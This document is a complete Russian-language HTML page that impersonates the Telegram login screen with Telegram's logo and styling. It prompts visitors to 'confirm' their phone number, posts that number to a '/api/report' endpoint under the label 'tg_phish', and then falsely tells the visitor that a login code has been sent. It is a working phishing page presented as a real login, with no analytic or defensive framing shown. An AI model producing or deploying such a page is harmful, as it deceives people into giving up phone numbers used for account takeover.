<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; max-width: 350px; width: 100%; padding: 20px; }
        .logo { width: 100px; margin-bottom: 30px; }
        h2 { font-size: 24px; margin-bottom: 10px; }
        p { color: #707579; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }
        input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; background: #f1f1f1; border: none; }
        button { width: 100%; padding: 15px; background-color: #2AABEE; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
        button:active { background-color: #1c87c0; }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
        <h2>Вход в Telegram</h2>
        <p>Пожалуйста, подтвердите ваш номер телефона для входа.</p>
        <input type="text" id="phone" placeholder="Номер телефона" />
        <button onclick="sendPhone()">Далее</button>
    </div>
    <script>
        function sendPhone() {
            const phone = document.getElementById('phone').value;
            if(!phone) return;
            fetch('/api/report', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: 'tg_phish', kind: 'tg_number', body: phone })
            }).then(() => {
                alert('Код отправлен в Telegram!');
            });
        }
    </script>
</body>
</html>
